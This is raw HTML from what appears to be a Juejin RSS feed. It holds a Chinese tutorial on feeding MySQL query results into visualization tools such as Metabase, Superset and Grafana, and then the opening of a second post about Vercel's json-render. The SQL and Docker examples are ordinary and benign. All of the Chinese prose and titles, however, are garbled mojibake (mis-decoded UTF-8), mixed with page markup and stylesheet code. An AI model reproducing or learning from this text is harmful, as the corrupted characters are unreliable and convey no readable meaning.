itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§é»„è¯„æµ‹"/> <meta itemprop="url" content="https://juejin.cn/user/714024404135696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨MySQLç©è½¬æ•°æ®å¯è§†åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/714024404135696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§é»„è¯„æµ‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:56:25.000Z" title="Thu Jan 22 2026 06:56:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç”¨ MySQL ç©è½¬æ•°æ®å¯è§†åŒ–ï¼Œæ ¸å¿ƒæ€è·¯æ˜¯ï¼š<strong>MySQL è´Ÿè´£å­˜å‚¨ä¸æŸ¥è¯¢æ•°æ®ï¼Œå¯è§†åŒ–å·¥å…·è´Ÿè´£å‘ˆç°ç»“æœ</strong>ã€‚è™½ç„¶ MySQL æœ¬èº«ä¸å…·å¤‡å›¾å½¢åŒ–å±•ç¤ºèƒ½åŠ›ï¼Œä½†é€šè¿‡ä¸ä¸»æµ BIï¼ˆå•†ä¸šæ™ºèƒ½ï¼‰æˆ–ç¼–ç¨‹å·¥å…·é›†æˆï¼Œä½ å¯ä»¥è½»æ¾å®ç°åŠ¨æ€ã€äº¤äº’å¼çš„æ•°æ®çœ‹æ¿ã€‚</p>
<p>ä¸‹é¢ä» <strong>å‡†å¤‡ â†’ æŸ¥è¯¢ â†’ å¯è§†åŒ– â†’ å®æˆ˜æ¡ˆä¾‹</strong> å››æ­¥ï¼Œæ‰‹æŠŠæ‰‹æ•™ä½ ç©è½¬ï¼</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€å‡†å¤‡å·¥ä½œï¼šè®© MySQL â€œå¯è¢«è¿æ¥â€</h2>
<h3 data-id="heading-1">1. å¼€å¯è¿œç¨‹è®¿é—®ï¼ˆå¦‚éœ€ï¼‰</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºä¸“ç”¨ç”¨æˆ·ï¼ˆå®‰å…¨æœ€ä½³å®è·µï¼‰</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'bi_user'</span>@<span class="hljs-string">'%'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'StrongPass123!'</span>;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ON</span> your_db.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'bi_user'</span>@<span class="hljs-string">'%'</span>;
FLUSH PRIVILEGES;
</code></pre>
<h3 data-id="heading-2">2. ç¡®ä¿ MySQL æœåŠ¡å…è®¸å¤–éƒ¨è¿æ¥</h3>
<ul>
<li>æ£€æŸ¥ <code>my.cnf</code> ä¸­æ˜¯å¦æ³¨é‡Šæ‰ <code>bind-address = 127.0.0.1</code></li>
<li>å¼€æ”¾é˜²ç«å¢™ç«¯å£ï¼ˆé»˜è®¤ 3306ï¼‰</li>
</ul>
<blockquote>
<p>ğŸ’¡ æœ¬åœ°å¼€å‘å¯è·³è¿‡ï¼Œç›´æ¥ç”¨ <code>localhost</code> è¿æ¥ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">äºŒã€é«˜æ•ˆæŸ¥è¯¢ï¼šä¸ºå¯è§†åŒ–â€œå–‚â€å¥½æ•°æ®</h2>
<p>å¯è§†åŒ–å·¥å…·ä¾èµ–æ¸…æ™°ã€èšåˆåçš„ç»“æœé›†ã€‚é¿å…ç›´æ¥æ‹–åŸå§‹è¡¨ï¼</p>
<h3 data-id="heading-4">âœ… æ¨èå†™æ³•ï¼šé¢„èšåˆ + æ—¶é—´ç»´åº¦</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç¤ºä¾‹ï¼šæ¯æ—¥é”€å”®é¢è¶‹åŠ¿ï¼ˆé€‚åˆæŠ˜çº¿å›¾ï¼‰</span>
<span class="hljs-keyword">SELECT</span> 
    <span class="hljs-type">DATE</span>(order_time) <span class="hljs-keyword">AS</span> order_date,
    <span class="hljs-built_in">SUM</span>(amount) <span class="hljs-keyword">AS</span> daily_revenue,
    <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> order_count
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> order_time <span class="hljs-operator">&gt;=</span> CURDATE() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">30</span> <span class="hljs-keyword">DAY</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-type">DATE</span>(order_time)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> order_date;
</code></pre>
<h3 data-id="heading-5">âœ… åœ°ç†åˆ†å¸ƒæ•°æ®ï¼ˆé€‚åˆåœ°å›¾ï¼‰</h3>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">SELECT</span> 
    province,
    COUNT(user_id) <span class="hljs-keyword">AS</span> user_count
<span class="hljs-keyword">FROM</span> users
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> province;
</code></pre>
<h3 data-id="heading-6">âœ… åˆ†ç±»å æ¯”ï¼ˆé€‚åˆé¥¼å›¾/ç¯å½¢å›¾ï¼‰</h3>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">SELECT</span> 
    category,
    COUNT(*) <span class="hljs-keyword">AS</span> product_count
<span class="hljs-keyword">FROM</span> products
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> category;
</code></pre>
<blockquote>
<p>ğŸ“Œ åŸåˆ™ï¼š<strong>ä¸€è¡Œä¸€è®°å½•ï¼Œä¸€åˆ—ä¸€ç»´åº¦/æŒ‡æ ‡</strong>ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">ä¸‰ã€ä¸»æµå¯è§†åŒ–å·¥å…·å¯¹æ¥ MySQL</h2>



































<table><thead><tr><th>å·¥å…·</th><th>ç‰¹ç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>Metabase</strong>ï¼ˆå¼€æºå…è´¹ï¼‰</td><td>éƒ¨ç½²ç®€å•ï¼ŒSQL + è‡ªç„¶è¯­è¨€åŒæ¨¡å¼</td><td>ä¸­å°ä¼ä¸šã€ä¸ªäººé¡¹ç›®</td></tr><tr><td><strong>Superset</strong>ï¼ˆApache å¼€æºï¼‰</td><td>å¼ºå¤§å›¾è¡¨åº“ï¼Œæ”¯æŒè‡ªå®šä¹‰æ’ä»¶</td><td>æ•°æ®å·¥ç¨‹å¸ˆã€åˆ†æå¸ˆ</td></tr><tr><td><strong>Tableau / Power BI</strong></td><td>ä¸“ä¸šçº§ BIï¼Œæ‹–æ‹½ä½“éªŒæä½³</td><td>ä¼ä¸šæŠ¥è¡¨ã€é«˜ç®¡çœ‹æ¿</td></tr><tr><td><strong>Grafana</strong></td><td>ä¸“æ³¨æ—¶åºæ•°æ®ï¼Œç›‘æ§å‘Šè­¦å¼º</td><td>è¿ç»´ã€IoTã€æ—¥å¿—åˆ†æ</td></tr><tr><td><strong>Python (Matplotlib/Seaborn/Plotly)</strong></td><td>å®Œå…¨å¯æ§ï¼Œé€‚åˆè‡ªåŠ¨åŒ–æŠ¥å‘Š</td><td>æ•°æ®ç§‘å­¦ã€ç§‘ç ”</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-8">å››ã€å®æˆ˜æ¼”ç¤ºï¼šç”¨ Metabase å¿«é€Ÿæ­å»ºé”€å”®çœ‹æ¿ï¼ˆ5åˆ†é’Ÿï¼‰</h2>
<h3 data-id="heading-9">æ­¥éª¤ 1ï¼šå®‰è£… Metabaseï¼ˆDocker ä¸€é”®å¯åŠ¨ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">docker run -d -p 3000:3000 \
  -e MB_DB_FILE=/metabase-data/metabase.db \
  --name metabase metabase/metabase
</code></pre>
<h3 data-id="heading-10">æ­¥éª¤ 2ï¼šè¿æ¥ MySQL</h3>
<ul>
<li>è®¿é—® <code>http://localhost:3000</code></li>
<li>é€‰æ‹© â€œConnect a databaseâ€ â†’ MySQL</li>
<li>å¡«å…¥ä¸»æœºã€ç«¯å£ã€æ•°æ®åº“åã€ç”¨æˆ·åã€å¯†ç </li>
</ul>
<h3 data-id="heading-11">æ­¥éª¤ 3ï¼šåˆ›å»ºé—®é¢˜ï¼ˆQuestionï¼‰</h3>
<ul>
<li>é€‰æ‹©è¡¨ <code>orders</code></li>
<li>è®¾ç½®è¿‡æ»¤ï¼š<code>order_time</code> è¿‡å»30å¤©</li>
<li>èšåˆï¼šæŒ‰ <code>DATE(order_time)</code> åˆ†ç»„ï¼Œæ±‚å’Œ <code>amount</code></li>
<li>é€‰æ‹©å›¾è¡¨ç±»å‹ï¼š<strong>Line chart</strong></li>
</ul>
<h3 data-id="heading-12">æ­¥éª¤ 4ï¼šç»„åˆæˆ Dashboard</h3>
<ul>
<li>å°†å¤šä¸ªâ€œé—®é¢˜â€ï¼ˆå¦‚é”€å”®é¢ã€è®¢å•é‡ã€ç”¨æˆ·åœ°åŸŸåˆ†å¸ƒï¼‰æ‹–å…¥åŒä¸€çœ‹æ¿</li>
<li>æ”¯æŒç­›é€‰å™¨è”åŠ¨ï¼ˆå¦‚æŒ‰çœä»½ç­›é€‰æ‰€æœ‰å›¾è¡¨ï¼‰</li>
</ul>
<p>âœ… æ•ˆæœï¼šä¸€ä¸ªå®æ—¶æ›´æ–°çš„ Web é”€å”®ä»ªè¡¨ç›˜ï¼</p>
<hr/>
<h2 data-id="heading-13">äº”ã€é«˜çº§æŠ€å·§ï¼šè®©å¯è§†åŒ–æ›´æ™ºèƒ½</h2>
<h3 data-id="heading-14">1. ä½¿ç”¨ <strong>CTE</strong> æˆ– <strong>è§†å›¾</strong> ç®€åŒ–å¤æ‚é€»è¾‘</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">CREATE VIEW sales_summary <span class="hljs-keyword">AS</span>
<span class="hljs-keyword">WITH</span> daily_stats <span class="hljs-keyword">AS</span> (
    <span class="hljs-keyword">SELECT</span> 
        <span class="hljs-type">DATE</span>(created_at) <span class="hljs-keyword">AS</span> dt,
        SUM(price) <span class="hljs-keyword">AS</span> revenue
    <span class="hljs-keyword">FROM</span> transactions
    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-type">DATE</span>(created_at)
)
<span class="hljs-keyword">SELECT</span> 
    dt,
    revenue,
    LAG(revenue, <span class="hljs-number">7</span>) OVER (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> dt) <span class="hljs-keyword">AS</span> last_week_rev,
    (revenue - LAG(revenue, <span class="hljs-number">7</span>) OVER (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> dt)) / LAG(revenue, <span class="hljs-number">7</span>) OVER (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> dt) * <span class="hljs-number">100</span> <span class="hljs-keyword">AS</span> wow_growth
<span class="hljs-keyword">FROM</span> daily_stats;
</code></pre>
<p>â†’ ç›´æ¥åœ¨å¯è§†åŒ–å·¥å…·ä¸­è°ƒç”¨ <code>sales_summary</code>ï¼Œæ— éœ€é‡å¤å†™é€»è¾‘ã€‚</p>
<h3 data-id="heading-15">2. åˆ©ç”¨ <strong>JSON å‡½æ•°</strong> è§£æåŠç»“æ„åŒ–æ•°æ®</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">-- è‹¥ tags å­—æ®µä¸º JSONï¼š{<span class="hljs-string">"source"</span>: <span class="hljs-string">"wechat"</span>, <span class="hljs-string">"campaign"</span>: <span class="hljs-string">"spring2026"</span>}
<span class="hljs-keyword">SELECT</span> 
    JSON_UNQUOTE(JSON_EXTRACT(tags, <span class="hljs-comment">'$.source')) AS source,</span>
    COUNT(*) 
<span class="hljs-keyword">FROM</span> users 
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> source;
</code></pre>
<h3 data-id="heading-16">3. å®šæ—¶åˆ·æ–°ï¼šé…åˆ <strong>ç‰©åŒ–è§†å›¾</strong>ï¼ˆMySQL 8.0+ æ¨¡æ‹Ÿï¼‰</h3>
<ul>
<li>ç”¨ Event Scheduler æ¯å°æ—¶æ›´æ–°æ±‡æ€»è¡¨ï¼š</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> EVENT refresh_daily_sales
<span class="hljs-keyword">ON</span> SCHEDULE <span class="hljs-keyword">EVERY</span> <span class="hljs-number">1</span> <span class="hljs-keyword">HOUR</span>
DO
  REPLACE <span class="hljs-keyword">INTO</span> agg_daily_sales
  <span class="hljs-keyword">SELECT</span> <span class="hljs-type">DATE</span>(...), <span class="hljs-built_in">SUM</span>(...) <span class="hljs-keyword">FROM</span> raw_table <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> ...;
</code></pre>
<hr/>
<h2 data-id="heading-17">å…­ã€é¿å‘æŒ‡å—</h2>

























<table><thead><tr><th>é—®é¢˜</th><th>è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>å›¾è¡¨åŠ è½½æ…¢</td><td>åœ¨ MySQL å»ºç«‹å¤åˆç´¢å¼•ï¼ˆå¦‚ <code>(order_time, status)</code>ï¼‰</td></tr><tr><td>ä¸­æ–‡ä¹±ç </td><td>è¿æ¥å­—ç¬¦ä¸²åŠ  <code>?charset=utf8mb4</code>ï¼Œæ•°æ®åº“ç”¨ <code>utf8mb4</code> ç¼–ç </td></tr><tr><td>æƒé™è¿‡å¤§</td><td>ä»…æˆäºˆ <code>SELECT</code> æƒé™ï¼Œç¦ç”¨ <code>DROP/UPDATE</code></td></tr><tr><td>å®æ—¶æ€§å·®</td><td>å¯¹é«˜é¢‘æ›´æ–°åœºæ™¯ï¼Œè€ƒè™‘å¼•å…¥ Kafka + Flink åšæµå¤„ç†ï¼Œå†å†™å…¥ MySQL æ±‡æ€»è¡¨</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-18">ç»“è¯­ï¼šMySQL æ˜¯å¼•æ“ï¼Œå¯è§†åŒ–æ˜¯é©¾é©¶èˆ±</h2>
<blockquote>
<p><strong>ä¸è¦æŒ‡æœ› MySQL ç”»å›¾ï¼Œè€Œè¦è®©å®ƒæˆä¸ºæœ€å¯é çš„æ•°æ®å¼•æ“</strong>ã€‚</p>
</blockquote>
<p>é€šè¿‡åˆç†å»ºæ¨¡ã€é«˜æ•ˆæŸ¥è¯¢ + ä¸“ä¸šå¯è§†åŒ–å·¥å…·ï¼Œä½ å®Œå…¨å¯ä»¥ç”¨ MySQL æ„å»ºåª²ç¾å•†ä¸šç³»ç»Ÿçš„æ•°æ®çœ‹æ¿ã€‚æ— è®ºæ˜¯ç›‘æ§ä¸šåŠ¡æŒ‡æ ‡ã€åˆ†æç”¨æˆ·è¡Œä¸ºï¼Œè¿˜æ˜¯ç”Ÿæˆæ—¥æŠ¥å‘¨æŠ¥ï¼Œè¿™å¥—ç»„åˆæ‹³éƒ½èƒ½è½»æ¾åº”å¯¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vercel å¼€æº json-renderï¼çŸ­çŸ­ 4 å¤©ç‹‚æ½ 7500 Starï¼Œè¿™æ‰æ˜¯ AI ç”Ÿæˆ UI çš„ç»ˆæè§£æ³•ï¼]]></title>    <link>https://juejin.cn/post/7597394607371730979</link>    <guid>https://juejin.cn/post/7597394607371730979</guid>    <pubDate>2026-01-21T04:22:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597394607371730979" data-draft-id="7597362768644636707" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vercel å¼€æº json-renderï¼çŸ­çŸ­ 4 å¤©ç‹‚æ½ 7500 Starï¼Œè¿™æ‰æ˜¯ AI ç”Ÿæˆ UI çš„ç»ˆæè§£æ³•ï¼"/> <meta itemprop="keywords" content="JavaScript,GitHub,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-21T04:22:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€æºæ˜Ÿæ¢"/> <meta itemprop="url" content="https://juejin.cn/user/2977915149494248"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vercel å¼€æº json-renderï¼çŸ­çŸ­ 4 å¤©ç‹‚æ½ 7500 Starï¼Œè¿™æ‰æ˜¯ AI ç”Ÿæˆ UI çš„ç»ˆæè§£æ³•ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2977915149494248/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€æºæ˜Ÿæ¢
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T04:22:40.000Z" title="Wed Jan 21 2026 04:22:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœä½ å…³æ³¨å‰ç«¯æˆ– AI åœˆï¼Œè¿™å‡ å¤©ä¸€å®šè¢« Vercel æœ€æ–°å¼€æºçš„ <strong>json-render</strong> åˆ·å±äº†ã€‚</p>
<p>å››å¤©æ—¶é—´ï¼Œ7500 Starã€‚è¿™ä¸ä»…æ˜¯ç«ï¼Œè¿™æ˜¯â€œçˆ†æ¬¾â€çš„èŠ‚å¥ã€‚
